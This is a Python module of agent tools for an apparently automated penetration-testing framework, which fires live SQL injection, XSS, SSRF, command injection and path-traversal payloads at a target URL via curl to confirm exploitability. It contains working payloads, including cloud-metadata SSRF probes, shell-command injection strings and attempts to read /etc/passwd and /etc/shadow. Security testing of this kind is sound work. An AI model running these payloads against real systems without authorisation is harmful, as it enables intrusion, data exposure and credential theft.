"""
PoC Validation Tools - Proof of Concept Validation

Provides tools to validate that vulnerabilities are actually exploitable,
not just theoretical. Confirms exploits work with real validation.
"""

import asyncio
import subprocess
import json
import time
import hashlib
import urllib.parse
from typing import List
from dataclasses import dataclass, field
from datetime import datetime
from src.sdk.tool import function_tool
from src.sdk.fp_filter import validate_finding, get_validation_pipeline


@dataclass
class ValidationResult:
    """Result of a PoC validation."""
    vulnerability: str
    validated: bool
    evidence: str
    poc_command: str
    timestamp: datetime = field(default_factory=datetime.now)
    confidence: str = "low"  # low, medium, high, confirmed


# Store validated vulnerabilities
_validated_vulns: List[ValidationResult] = []


def get_validated_vulns() -> List[ValidationResult]:
    """Get all validated vulnerabilities."""
    return _validated_vulns


@function_tool()
def validate_sqli(url: str, parameter: str, payload: str = "") -> str:
    """
    Validate SQL Injection vulnerability with actual exploitation.
    Uses error-based, time-based, and UNION-based techniques.
    
    Args:
        url: Target URL with vulnerable parameter
        parameter: Parameter to test
        payload: Custom payload (optional, uses smart detection)
    
    Returns:
        Validation result with evidence
    """
    results = ["## SQL Injection Validation\n"]
    
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    
    validated = False
    evidence = []
    poc = ""
    confidence = "low"
    confirmed_payload = ""
    
    # Test 1: Error-based detection
    error_payloads = [payload] if payload else []
    error_payloads.extend(["'", "\"", "' OR '1'='1", "1' AND '1'='2"])
    sql_errors = ["sql", "syntax", "mysql", "ora-", "postgresql", "sqlite"]
    
    results.append("### Testing Error-Based SQLi...")
    
    for ep in error_payloads:
        test_params = params.copy()
        test_params[parameter] = params.get(parameter, "") + ep
        test_query = urllib.parse.urlencode(test_params)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
        
        cmd = ["curl", "-s", "--max-time", "10", test_url]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            response = result.stdout.lower()
            
            for error in sql_errors:
                if error in response:
                    validated = True
                    evidence.append(f"SQL error with payload: {ep}")
                    poc = f"curl '{test_url}'"
                    confidence = "medium"
                    confirmed_payload = ep
                    results.append(f"  ✅ SQL error triggered: {error}")
                    break
        except Exception:
            pass
        
        if validated:
            break
    
    # Test 2: Boolean-based detection
    if not validated:
        results.append("\n### Testing Boolean-Based SQLi...")
        
        # True condition
        test_params = params.copy()
        test_params[parameter] = params.get(parameter, "1") + "' AND '1'='1"
        test_query = urllib.parse.urlencode(test_params)
        true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
        
        # False condition  
        test_params[parameter] = params.get(parameter, "1") + "' AND '1'='2"
        test_query = urllib.parse.urlencode(test_params)
        false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
        
        try:
            true_resp = subprocess.run(["curl", "-s", "--max-time", "10", true_url],
                                      capture_output=True, text=True, timeout=15)
            false_resp = subprocess.run(["curl", "-s", "--max-time", "10", false_url],
                                       capture_output=True, text=True, timeout=15)
            
            if len(true_resp.stdout) != len(false_resp.stdout):
                diff = abs(len(true_resp.stdout) - len(false_resp.stdout))
                if diff > 50:  # Significant difference
                    validated = True
                    evidence.append(f"Boolean-based: response size differs by {diff} bytes")
                    poc = f"True: {true_url}\nFalse: {false_url}"
                    confidence = "medium"
                    confirmed_payload = "' AND '1'='1"
                    results.append(f"  ✅ Boolean difference: {diff} bytes")
        except Exception:
            pass
    
    # Test 3: Time-based blind detection
    if not validated:
        results.append("\n### Testing Time-Based Blind SQLi...")

        # ── Establish baseline FIRST to avoid timeout false positives ──────
        # If the target is unreachable / always slow, elapsed ≥ 2.5s is meaningless.
        # We only confirm SQLi if the SLEEP payload is SIGNIFICANTLY slower than
        # the benign baseline (at least 2× slower and at least +2.5 s more).
        baseline_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
        baseline_elapsed = 0.0
        try:
            b_start = time.time()
            subprocess.run(["curl", "-s", "--max-time", "8", baseline_url],
                           capture_output=True, text=True, timeout=10)
            baseline_elapsed = time.time() - b_start
            results.append(f"  Baseline response time: {baseline_elapsed:.2f}s")
        except Exception:
            baseline_elapsed = 0.0  # unknown baseline — will be conservative

        # If baseline itself hits ~5s (unresolvable host) skip entirely: target unreachable
        if baseline_elapsed >= 4.5:
            results.append("  ⚠️ Baseline already slow (host may be unreachable) — skipping time-based test")
        else:
            time_payloads = [
                "' AND SLEEP(3)--",
                "1' AND SLEEP(3)--",
                "'; WAITFOR DELAY '0:0:3'--",
                "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"
            ]
            if payload:
                time_payloads.insert(0, payload)

            for tp in time_payloads:
                test_params = params.copy()
                test_params[parameter] = params.get(parameter, "") + tp
                test_query = urllib.parse.urlencode(test_params)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"

                try:
                    start = time.time()
                    result = subprocess.run(["curl", "-s", "--max-time", "12", test_url],
                                           capture_output=True, text=True, timeout=15)
                    elapsed = time.time() - start

                    # Confirm only if: absolute delay ≥ 2.5s AND delay is at least
                    # baseline + 2.0s (rules out naturally slow/down hosts)
                    significant = (elapsed >= 2.5) and (elapsed >= baseline_elapsed + 2.0)
                    if significant:
                        validated = True
                        evidence.append(f"Time-based: {elapsed:.2f}s delay (baseline {baseline_elapsed:.2f}s) with SLEEP")
                        poc = f"curl '{test_url}'"
                        confidence = "high"
                        confirmed_payload = tp
                        results.append(f"  ✅ Time delay: {elapsed:.2f}s (baseline {baseline_elapsed:.2f}s, Δ={elapsed-baseline_elapsed:.2f}s)")
                        break
                    else:
                        results.append(f"  ✗ {elapsed:.2f}s — not significantly above baseline ({baseline_elapsed:.2f}s)")
                except subprocess.TimeoutExpired:
                    # Only a true timeout (>15s) when baseline was fast counts as confirmation
                    if baseline_elapsed < 4.0:
                        validated = True
                        evidence.append("Time-based: Request timed out (sleeping)")
                        confidence = "high"
                        confirmed_payload = tp
                        results.append("  ✅ Request timed out (successful sleep)")
                    else:
                        results.append("  ⚠️ Request timed out but baseline was also slow — not confirmed")
                    break
                except Exception:
                    pass
    
    # Store result
    validation = ValidationResult(
        vulnerability="sql_injection",
        validated=validated,
        evidence="\n".join(evidence),
        poc_command=poc,
        confidence=confidence
    )
    _validated_vulns.append(validation)
    
    # Summary
    results.append("\n### Validation Result")
    if validated:
        results.append(f"🔴 **CONFIRMED SQL INJECTION** (Confidence: {confidence})")
        results.append("\nEvidence:")
        for e in evidence:
            results.append(f"  - {e}")
        results.append("\nPoC Command:")
        results.append(f"```\n{poc}\n```")
        try:
            from src.tools.vuln_db import register_vulnerability
            severity = "CRITICAL" if confidence in {"high", "confirmed"} else "HIGH"
            register_result = asyncio.run(register_vulnerability.invoke(
                target_url=url,
                vuln_type="SQL Injection",
                severity=severity,
                parameter=parameter,
                payload=confirmed_payload,
                evidence="\n".join(evidence),
                metadata=json.dumps({"poc": poc, "confidence": confidence}),
                status="VERIFIED",
            ))
            results.append(f"\nPersistence: {register_result}")
        except Exception as e:
            results.append(f"\nPersistence warning: could not register SQLi finding: {e}")
    else:
        results.append("⚠️ Could not validate SQLi (may require manual testing)")
    
    return "\n".join(results)


@function_tool()
def validate_xss(url: str, parameter: str, payload: str = "") -> str:
    """
    Validate XSS vulnerability by checking if payload is reflected unencoded.
    
    Args:
        url: Target URL
        parameter: Vulnerable parameter
        payload: Custom XSS payload (optional)
    
    Returns:
        Validation result with evidence
    """
    results = ["## XSS Validation\n"]
    
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    
    validated = False
    evidence = []
    poc = ""
    confidence = "low"
    
    # Generate unique identifier for detection
    unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    
    test_payloads = [
        f'<script>alert("{unique_id}")</script>',
        f'"><script>alert("{unique_id}")</script>',
        f"'-alert('{unique_id}')-'",
        f'<img src=x onerror=alert("{unique_id}")>',
        f'<svg onload=alert("{unique_id}")>',
    ]
    
    if payload:
        test_payloads.insert(0, payload)
    
    for xss_payload in test_payloads:
        test_params = params.copy()
        test_params[parameter] = xss_payload
        test_query = urllib.parse.urlencode(test_params)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
        
        cmd = ["curl", "-s", "--max-time", "10", test_url]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            response = result.stdout
            
            # Check if payload is reflected without encoding
            if xss_payload in response:
                # Verify it's not HTML encoded
                encoded = xss_payload.replace("<", "&lt;").replace(">", "&gt;")
                
                if encoded not in response:
                    validated = True
                    evidence.append(f"Payload reflected unencoded: {xss_payload[:50]}")
                    poc = f"curl '{test_url}'"
                    confidence = "high"
                    results.append(f"✅ Payload reflected: {xss_payload[:40]}...")
                    break
                else:
                    results.append(f"⚠️ Payload encoded (safe): {xss_payload[:30]}...")
            
            # Check for partial reflection (attribute context)
            if unique_id in response:
                validated = True
                evidence.append("Unique ID reflected in response")
                poc = f"curl '{test_url}'"
                confidence = "medium"
                results.append("✅ Identifier reflected in response")
        
        except Exception as e:
            results.append(f"Error: {str(e)[:40]}")
    
    # Store result
    validation = ValidationResult(
        vulnerability="xss",
        validated=validated,
        evidence="\n".join(evidence),
        poc_command=poc,
        confidence=confidence
    )
    _validated_vulns.append(validation)
    
    # Summary
    results.append("\n### Validation Result")
    if validated:
        results.append(f"🔴 **CONFIRMED XSS** (Confidence: {confidence})")
        results.append("\nEvidence:")
        for e in evidence:
            results.append(f"  - {e}")
        results.append("\nPoC:")
        results.append(f"```\n{poc}\n```")
    else:
        results.append("⚠️ Could not validate XSS (payload may be filtered)")
    
    return "\n".join(results)


@function_tool()
def validate_ssrf(url: str, parameter: str, callback_url: str = "") -> str:
    """
    Validate SSRF by testing internal service access.
    
    Args:
        url: Target URL
        parameter: Parameter that accepts URLs
        callback_url: Optional callback URL for OOB detection
    
    Returns:
        Validation result
    """
    results = ["## SSRF Validation\n"]
    
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    
    validated = False
    evidence = []
    poc = ""
    
    # Internal targets to test
    targets = [
        ("http://127.0.0.1", ["localhost", "127.0.0.1"]),
        ("http://localhost:22", ["SSH", "OpenSSH"]),
        ("http://169.254.169.254/latest/meta-data/", ["ami-", "instance"]),
        ("http://[::1]", ["localhost"]),  # IPv6 localhost
    ]
    
    for ssrf_url, indicators in targets:
        test_params = params.copy()
        test_params[parameter] = ssrf_url
        test_query = urllib.parse.urlencode(test_params)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
        
        try:
            result = subprocess.run(["curl", "-s", "--max-time", "10", test_url],
                                   capture_output=True, text=True, timeout=15)
            response = result.stdout
            
            for indicator in indicators:
                if indicator.lower() in response.lower():
                    validated = True
                    evidence.append(f"Internal access: {ssrf_url} - Found: {indicator}")
                    poc = f"curl '{test_url}'"
                    results.append(f"✅ {ssrf_url} - {indicator} found")
                    break
        except Exception:
            pass
    
    # Store result
    validation = ValidationResult(
        vulnerability="ssrf",
        validated=validated,
        evidence="\n".join(evidence),
        poc_command=poc,
        confidence="high" if validated else "low"
    )
    _validated_vulns.append(validation)
    
    results.append("\n### Validation Result")
    if validated:
        results.append("🔴 **CONFIRMED SSRF**")
        for e in evidence:
            results.append(f"  - {e}")
    else:
        results.append("⚠️ Could not validate SSRF")
    
    return "\n".join(results)


@function_tool()
def validate_command_injection(url: str, parameter: str) -> str:
    """
    Validate command injection with time-based and output-based detection.
    
    Args:
        url: Target URL
        parameter: Vulnerable parameter
    
    Returns:
        Validation result
    """
    results = ["## Command Injection Validation\n"]
    
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    
    validated = False
    evidence = []
    poc = ""
    
    # Time-based payloads
    time_payloads = [
        ("; sleep 3", 3),
        ("| sleep 3", 3),
        ("$(sleep 3)", 3),
        ("`sleep 3`", 3),
        ("& ping -n 5 127.0.0.1 &", 4),  # Windows
    ]
    
    results.append("### Testing Time-Based Detection...")
    
    for payload, expected_delay in time_payloads:
        test_params = params.copy()
        test_params[parameter] = params.get(parameter, "") + payload
        test_query = urllib.parse.urlencode(test_params)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
        
        try:
            start = time.time()
            result = subprocess.run(["curl", "-s", "--max-time", "15", test_url],
                                   capture_output=True, text=True, timeout=20)
            elapsed = time.time() - start
            
            if elapsed >= expected_delay - 0.5:
                validated = True
                evidence.append(f"Time delay: {elapsed:.2f}s with {payload}")
                poc = f"curl '{test_url}'"
                results.append(f"✅ Delay: {elapsed:.2f}s with {payload}")
                break
        except subprocess.TimeoutExpired:
            validated = True
            evidence.append(f"Timeout with {payload}")
            break
        except Exception:
            pass
    
    # Output-based detection
    if not validated:
        results.append("\n### Testing Output-Based Detection...")
        
        unique_marker = f"CMDTEST{hashlib.md5(str(time.time()).encode()).hexdigest()[:6]}"
        output_payloads = [
            f"; echo {unique_marker}",
            f"| echo {unique_marker}",
            f"$(echo {unique_marker})",
        ]
        
        for payload in output_payloads:
            test_params = params.copy()
            test_params[parameter] = params.get(parameter, "") + payload
            test_query = urllib.parse.urlencode(test_params)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
            
            try:
                result = subprocess.run(["curl", "-s", "--max-time", "10", test_url],
                                       capture_output=True, text=True, timeout=15)
                if unique_marker in result.stdout:
                    validated = True
                    evidence.append(f"Output reflected: {payload}")
                    poc = f"curl '{test_url}'"
                    results.append(f"✅ Output reflected with {payload}")
                    break
            except Exception:
                pass
    
    validation = ValidationResult(
        vulnerability="command_injection",
        validated=validated,
        evidence="\n".join(evidence),
        poc_command=poc,
        confidence="high" if validated else "low"
    )
    _validated_vulns.append(validation)
    
    results.append("\n### Validation Result")
    if validated:
        results.append("🔴 **CONFIRMED COMMAND INJECTION**")
    else:
        results.append("⚠️ Could not validate command injection")
    
    return "\n".join(results)


@function_tool()
def validate_path_traversal(url: str, parameter: str, target_file: str = "/etc/passwd") -> str:
    """
    Validate path traversal by attempting to read known files.
    
    Args:
        url: Target URL
        parameter: File parameter
        target_file: File to try reading
    
    Returns:
        Validation result
    """
    results = ["## Path Traversal Validation\n"]
    
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    
    validated = False
    evidence = []
    poc = ""
    
    # Traversal payloads
    payloads = [
        "../" * 5 + target_file.lstrip("/"),
        "..../" * 5 + target_file.lstrip("/"),
        target_file,
    ]
    
    # File content indicators
    indicators = {
        "/etc/passwd": ["root:", "daemon:", "nobody:"],
        "/etc/shadow": ["root:$"],
        "/windows/system32/drivers/etc/hosts": ["127.0.0.1", "localhost"],
    }
    
    file_indicators = indicators.get(target_file, ["root:", "localhost"])
    
    for payload in payloads:
        test_params = params.copy()
        test_params[parameter] = payload
        test_query = urllib.parse.urlencode(test_params)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
        
        try:
            result = subprocess.run(["curl", "-s", "--max-time", "10", test_url],
                                   capture_output=True, text=True, timeout=15)
            response = result.stdout
            
            for indicator in file_indicators:
                if indicator in response:
                    validated = True
                    evidence.append(f"File content found: {indicator}")
                    evidence.append(f"Payload: {payload}")
                    poc = f"curl '{test_url}'"
                    results.append(f"✅ Found: {indicator}")
                    break
        except Exception:
            pass
        
        if validated:
            break
    
    validation = ValidationResult(
        vulnerability="path_traversal",
        validated=validated,
        evidence="\n".join(evidence),
        poc_command=poc,
        confidence="confirmed" if validated else "low"
    )
    _validated_vulns.append(validation)
    
    results.append("\n### Validation Result")
    if validated:
        results.append("🔴 **CONFIRMED PATH TRAVERSAL**")
        results.append(f"\n```\n{poc}\n```")
    else:
        results.append("⚠️ Could not validate path traversal")
    
    return "\n".join(results)


@function_tool()
def get_validated_poc() -> str:
    """
    Get a summary of all validated vulnerabilities with PoC commands.
    
    Returns:
        Summary of validated vulnerabilities
    """
    results = ["## Validated Vulnerabilities Summary\n"]
    
    if not _validated_vulns:
        return "No vulnerabilities have been validated yet."
    
    confirmed = [v for v in _validated_vulns if v.validated]
    unconfirmed = [v for v in _validated_vulns if not v.validated]
    
    if confirmed:
        results.append(f"### ✅ Confirmed: {len(confirmed)}\n")
        for v in confirmed:
            results.append(f"**{v.vulnerability.upper()}** (Confidence: {v.confidence})")
            results.append(f"  Evidence: {v.evidence[:100]}")
            if v.poc_command:
                results.append(f"  PoC: `{v.poc_command[:80]}`")
            results.append("")
    
    if unconfirmed:
        results.append(f"\n### ⚠️ Unconfirmed: {len(unconfirmed)}")
        for v in unconfirmed:
            results.append(f"  - {v.vulnerability}")
    
    return "\n".join(results)


@function_tool()
def auto_validate(url: str, vulnerability_type: str, parameter: str = "") -> str:
    """
    Automatically validate a detected vulnerability.
    
    Args:
        url: Target URL
        vulnerability_type: Type of vulnerability (sqli, xss, ssrf, lfi, rce)
        parameter: Vulnerable parameter (auto-detected if empty)
    
    Returns:
        Validation result
    """
    vuln_map = {
        "sqli": validate_sqli,
        "sql_injection": validate_sqli,
        "xss": validate_xss,
        "cross-site-scripting": validate_xss,
        "ssrf": validate_ssrf,
        "lfi": validate_path_traversal,
        "path_traversal": validate_path_traversal,
        "rce": validate_command_injection,
        "command_injection": validate_command_injection,
    }
    
    vuln_type = vulnerability_type.lower().replace(" ", "_").replace("-", "_")
    
    if vuln_type not in vuln_map:
        return f"Unknown vulnerability type: {vulnerability_type}\nSupported: {', '.join(vuln_map.keys())}"
    
    # Auto-detect parameter if not provided
    if not parameter:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if params:
            parameter = list(params.keys())[0]
        else:
            return "Error: No parameter found. Please provide a URL with parameters."
    
    validator = vuln_map[vuln_type]
    return validator(url=url, parameter=parameter)


@function_tool()
def multi_validate(url: str, vuln_types: str, parameters: str = "") -> str:
    """
    Validate multiple vulnerability types against a URL in one call.

    Args:
        url: Target URL
        vuln_types: Comma-separated list of vuln types (e.g. "sqli,xss,ssrf,lfi")
        parameters: Comma-separated list of parameters to test (auto-detected if empty)

    Returns:
        Combined validation results for all requested vuln types
    """
    results = [f"## Multi-Validation Results for {url}\n"]

    vuln_list = [v.strip() for v in vuln_types.split(",") if v.strip()]
    param_list = [p.strip() for p in parameters.split(",") if p.strip()]

    # Auto-detect parameters if none provided
    if not param_list:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        param_list = list(params.keys()) if params else [""]

    for vuln_type in vuln_list:
        param = param_list[0] if param_list else ""
        result = auto_validate(url=url, vulnerability_type=vuln_type, parameter=param)
        results.append(f"### {vuln_type.upper()}\n{result}\n")

    return "\n".join(results)


@function_tool()
def score_finding(
    vuln_type: str,
    url: str,
    evidence: str,
    parameter: str = "",
    response_body: str = "",
    fetch_baseline: bool = False,
) -> str:
    """
    Run the 4-stage Anti-Hallucination Validation Pipeline on a single finding
    and return a confidence score + verdict.

    Pipeline stages:
      1. Negative Controls   — compares against a benign baseline request
      2. Proof of Execution  — checks for vuln-specific proof patterns in the response
      3. Confidence Scorer   — produces a 0–100 numeric score
      4. Validation Judge    — issues CONFIRMED / LIKELY / REJECTED verdict

    Args:
        vuln_type:      Type of vulnerability (e.g. sqli, xss, ssrf, lfi, rce, ssti)
        url:            Target URL where the finding was observed
        evidence:       Description of what was observed (error messages, payloads, etc.)
        parameter:      URL/body parameter that was fuzzed (optional, improves baseline)
        response_body:  Raw HTTP response body to check for proof (optional)
        fetch_baseline: If True, automatically fetch a real benign baseline via curl

    Returns:
        Formatted verdict string with score, breakdown, and evidence.
    """
    try:
        verdict = validate_finding(
            vuln_type=vuln_type,
            url=url,
            evidence=evidence,
            parameter=parameter,
            response_body=response_body,
            fetch_baseline=fetch_baseline,
        )
        return str(verdict)
    except Exception as exc:
        return f"❌ Validation pipeline error: {exc}"


@function_tool()
def batch_score_findings(findings_json: str) -> str:
    """
    Run the Anti-Hallucination Validation Pipeline on multiple findings at once.
    Findings with a score below 60 are suppressed (REJECTED).

    Args:
        findings_json: JSON array of finding objects.  Each object must have:
                       - vuln_type   (str) e.g. "sqli"
                       - url         (str)
                       - evidence    (str)
                       Optional:
                       - parameter   (str)
                       - response_body (str)

    Returns:
        Summary table of accepted vs rejected findings with scores.

    Example input:
        '[{"vuln_type":"sqli","url":"http://x.com/page?id=1","evidence":"SQL syntax error"}]'
    """
    try:
        findings = json.loads(findings_json)
        if not isinstance(findings, list):
            return "❌ Input must be a JSON array of finding objects."
    except json.JSONDecodeError as exc:
        return f"❌ Invalid JSON: {exc}"

    pipeline = get_validation_pipeline()
    accepted, rejected = pipeline.run_batch_filtered(findings)

    lines = [
        "## Validation Pipeline Results",
        f"Total findings  : {len(findings)}",
        f"Accepted (≥60)  : {len(accepted)}",
        f"Rejected (<60)  : {len(rejected)}",
        "",
        "### Accepted Findings",
    ]
    for v in accepted:
        lines.append(str(v))
        lines.append("")

    if rejected:
        lines.append("### Rejected Findings (suppressed)")
        for v in rejected:
            lines.append(
                f"⚪ [REJECTED] {v.vuln_type.upper()} — Score: {v.score}/100 "
                f"| same_as_baseline={v.same_as_baseline} "
                f"| fp_matched={v.fp_matched}"
            )

    return "\n".join(lines)


@function_tool()
async def multi_agent_verify(finding_details: str) -> str:
    """
    Spawns 2 VerifierAgents to independently validate a High/Critical finding.
    Only marks as confirmed if both succeed, or 1 confirms + 1 partial.
    Returns the confidence score and verdict.
    
    Args:
        finding_details: The details of the finding to verify (URL, params, vulnerability type).
    
    Returns:
        Verification verdict and confidence score.
    """
    import asyncio
    from src.agents.verifier_agent import create_verifier_agent
    from src.sdk.runner import get_runner
    
    runner1 = get_runner()
    runner2 = get_runner()
    
    agent1 = create_verifier_agent()
    agent2 = create_verifier_agent()
    
    prompt = f"Please verify this finding. Return a VERIFIED or REJECTED status with evidence.\nDetails:\n{finding_details}"
    
    # Run them concurrently
    res1, res2 = await asyncio.gather(
        runner1.run(agent1, prompt, max_iterations=5),
        runner2.run(agent2, prompt, max_iterations=5),
        return_exceptions=True
    )
    
    out1 = getattr(res1, "output", str(res1)).lower()
    out2 = getattr(res2, "output", str(res2)).lower()
    
    v1 = "verified" in out1 and "rejected" not in out1
    v2 = "verified" in out2 and "rejected" not in out2
    
    partial1 = "partial" in out1
    partial2 = "partial" in out2
    
    score = 0
    if v1: score += 1
    elif partial1: score += 0.5
    
    if v2: score += 1
    elif partial2: score += 0.5
    
    if score >= 2:
        confidence = "High"
        verdict = "CONFIRMED"
    elif score >= 1.5:
        confidence = "Medium"
        verdict = "CONFIRMED"
    elif score >= 1:
        confidence = "Low"
        verdict = "PARTIAL"
    else:
        confidence = "Low"
        verdict = "REJECTED"
        
    return (
        f"Multi-Agent Verification Verdict: {verdict}\n"
        f"Confidence: {confidence}\n"
        f"Agent 1 Score: {1 if v1 else 0.5 if partial1 else 0}/1\n"
        f"Agent 2 Score: {1 if v2 else 0.5 if partial2 else 0}/1\n"
        f"Details:\n"
        f"Agent 1 output snippet: {out1[:300]}\n"
        f"Agent 2 output snippet: {out2[:300]}"
    )
